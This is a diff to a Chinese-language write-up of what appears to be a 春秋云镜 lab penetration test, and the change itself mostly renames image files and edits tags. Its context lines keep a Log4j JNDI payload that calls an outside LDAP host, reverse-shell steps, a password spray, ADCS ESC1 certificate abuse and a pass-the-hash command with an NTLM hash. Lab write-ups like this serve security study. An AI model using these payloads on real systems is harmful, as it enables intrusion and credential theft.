@@ -6,9 +6,8 @@ date: "2025-08-22T17:48:09+08:00"
 lastmod: "2025-08-22T17:48:09+08:00"
 image: ""
 license: ""
-categories: ["春秋云镜"]
-tags: ["Pentest"]
-
+categories: ["offensive-security"]
+tags: ["春秋云镜"]
 ---
 ## flag1
 
@@ -25,7 +24,7 @@ start vulscan
 [*] WebTitle http://39.98.108.206:8983/solr/ code:200 len:16555  title:Solr Admin
 ```
 
-![image](./assets/001.webp)
+![image](./assets/001.png)
 
 发现了log4j，搜一下就知道路由了
 
@@ -33,7 +32,7 @@ start vulscan
 http://39.98.124.32:8983/solr/admin/cores?action=${jndi:ldap://oqoloubyms.dgrh3.cn}
 ```
 
-![image](./assets/002.webp)
+![image](./assets/002.png)
 
 成功了，那我们反弹shell https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0
 
@@ -47,7 +46,7 @@ http://39.98.124.32:8983/solr/admin/cores?action=${jndi:ldap://47.109.176.117:13
 
 挨个试，成功反弹shell
 
-![image](./assets/003.webp)
+![image](./assets/003.png)
 
 sudo配置有安全问题，可以提权
 
@@ -216,9 +215,9 @@ get personnel.db
 
 放到Navicat里面看一下
 
-![image](./assets/004.webp)
+![image](./assets/004.png)
 
-![image](./assets/005.webp)
+![image](./assets/005.png)
 
 直接密码喷洒攻击，看看哪个用户可以登录到域内机器，导出之后是带引号的，一行一个数据，需要处理一下
 
@@ -233,7 +232,7 @@ proxychains4 netexec rdp 172.22.9.26 -u usernames.txt -p passwords.txt --continu
 grep "\[+\]" rdp_results.txt
 ```
 
-![image](./assets/006.webp)
+![image](./assets/006.png)
 
 ```
 xiaorang.lab\liupeng:fiAzGwEMgTY
@@ -272,11 +271,11 @@ SharpHound.exe -c all
 
 看到有个逆天的关系
 
-![image](./assets/007.webp)
+![image](./assets/007.png)
 
 只要是在DOMAIN USERS@XAIORANG.LAB这个组里面的用户就可以打ADCS ESC1
 
-![image](./assets/008.webp)
+![image](./assets/008.png)
 
 满足条件，先查询证书模版
 
@@ -389,7 +388,7 @@ proxychains certipy-ad req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 17
 proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7
 ```
 
-![image](./assets/009.webp)
+![image](./assets/009.png)
 
 ```bash
 proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk
@@ -402,4 +401,3 @@ proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eef
 cd Users\Administrator\flag
 type flag03.txt
 ```
-
